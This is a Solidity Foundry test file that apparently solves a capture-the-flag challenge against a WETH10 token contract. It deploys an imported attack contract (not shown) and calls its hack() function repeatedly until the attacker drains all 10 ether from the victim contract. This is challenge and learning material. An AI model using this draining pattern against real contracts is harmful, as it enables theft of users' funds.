// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {WETH10} from "src/WETH10.sol";
import {Weth10Hack} from "src/WETH10Hack.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    Weth10Hack public wethhack;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob,bob);

        // hack time!
        wethhack = new Weth10Hack(address(weth));
        wethhack.deposit{value:1 ether}();

        assertEq(weth.balanceOf(address(wethhack)), 1 ether);

        assertEq(address(bob).balance, 0);
        wethhack.hack();
        assertEq(address(bob).balance, 1 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 2 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 3 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 4 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 5 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 6 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 7 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 8 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 9 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 10 ether);

        assertEq(weth.balanceOf(bob), 1 ether);
        hackDispatch();
        assertEq(address(bob).balance, 11 ether);

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }

    function hackDispatch() internal {
        weth.transfer(address(wethhack),1 ether);
        wethhack.hack();
    }
}